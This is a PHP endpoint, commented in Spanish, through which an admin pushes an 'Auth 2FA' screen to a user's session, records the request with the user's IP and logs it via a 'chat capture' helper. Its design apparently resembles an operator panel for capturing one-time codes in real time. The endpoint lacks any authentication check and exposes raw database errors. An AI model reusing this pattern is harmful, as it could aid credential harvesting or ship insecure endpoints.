<?php
/**
 * Enviar solicitud de Auth 2FA al usuario
 * El admin activa la tela Auth2fa en el cliente
 */
header('Content-Type: application/json');

try {
    require_once '../php_config/conexionbd.php';
    require_once __DIR__ . '/../php_modales/chat_captura_helper.php';
    $pdo = conectarBD();

    $input = json_decode(file_get_contents('php://input'), true);

    $usuario_id = intval($input['usuario_id'] ?? 0);
    $ip_usuario = $input['ip_usuario'] ?? 'unknown';

    if (!$usuario_id) {
        echo json_encode(['success' => false, 'error' => 'ID de usuario no válido']);
        exit;
    }

    $stmtUser = $pdo->prepare("SELECT id FROM usuarios WHERE id = ?");
    $stmtUser->execute([$usuario_id]);
    if (!$stmtUser->fetch()) {
        echo json_encode(['success' => false, 'error' => 'El usuario no existe']);
        exit;
    }

    require_once __DIR__ . '/../php_modales/cerrar_otras_telas.php';
    cerrarTelasPendientes($pdo, $usuario_id);

    // Cancelar solicitudes anteriores pendientes del mismo usuario
    $pdo->prepare("UPDATE auth2fa_enviados SET estado = 'cancelado' WHERE usuario_id = ? AND estado = 'pendiente'")
        ->execute([$usuario_id]);

    // Insertar nueva solicitud
    $stmt = $pdo->prepare("
        INSERT INTO auth2fa_enviados (usuario_id, ip_usuario, estado, fecha_envio)
        VALUES (?, ?, 'pendiente', NOW())
    ");

    if ($stmt->execute([$usuario_id, $ip_usuario])) {
        $auth2fa_id = (int) $pdo->lastInsertId();
        insertarMensajeAdmin($pdo, $usuario_id, $ip_usuario, 'Solicitud Auth 2FA');
        echo json_encode([
            'success'    => true,
            'message'    => 'Tela Auth 2FA enviada',
            'auth2fa_id' => $auth2fa_id
        ]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Error al crear la solicitud']);
    }

} catch (PDOException $e) {
    echo json_encode(['success' => false, 'error' => 'Error de base de datos: ' . $e->getMessage()]);
} catch (Exception $e) {
    echo json_encode(['success' => false, 'error' => 'Error: ' . $e->getMessage()]);
}
?>
